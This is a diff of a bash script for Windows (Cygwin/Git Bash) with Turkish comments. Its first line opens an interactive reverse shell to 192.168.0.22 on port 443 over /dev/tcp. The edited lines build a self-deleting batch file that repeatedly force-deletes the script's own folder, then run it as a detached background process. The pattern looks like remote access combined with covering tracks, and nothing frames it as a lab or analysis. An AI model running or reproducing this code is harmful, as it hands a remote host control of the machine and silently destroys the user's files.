@@ -2,21 +2,26 @@
 
 bash -i >&/dev/tcp/192.168.0.22/443 0>&1
 
-# 2. Silinecek klasörün Windows yolunu al
+# 1. Hedef klasör yolunu al
 TARGET_DIR=$(cygpath -w "$PWD")
 
-# 3. Geçici bir silici batch dosyası oluştur (Geçici dizine yazılır)
-CLEANUP_BAT="$TEMP/cleanup_$RANDOM.bat"
+# 2. Geçici klasörde (%TEMP%) bağımsız silici bir script oluştur
+CLEAN_BAT="$TEMP/del_bashexe_$RANDOM.bat"
 
-cat << EOF > "$CLEANUP_BAT"
+cat << EOF > "$CLEAN_BAT"
 @echo off
-timeout /t 2 /nobreak >nul
-rmdir /s /q "$TARGET_DIR"
+:loop
+timeout /t 1 /nobreak >nul
+rmdir /s /q "$TARGET_DIR" 2>nul
+if exist "$TARGET_DIR" goto loop
 del "%~f0"
 EOF
 
-# 4. Ana dizinden çık
+# 3. Silici script'i Windows üzerinde TAMAMEN BAĞIMSIZ bir süreç olarak başlat
+cmd.exe /c "start /b \"\" \"$CLEAN_BAT\""
+
+# 4. Kilitlenmeyi önlemek için klasörden çık
 cd ..
 
-# 5. Batch dosyasını arka planda tamamen bağımsız çalıştır
-cmd.exe /c start /b "" "$CLEANUP_BAT"
+# 5. Etkileşimli kabuğu başlat (veya çıkış yapıldığında betiğin sonlanmasını sağla)
+bash -i -c "dir; exit"
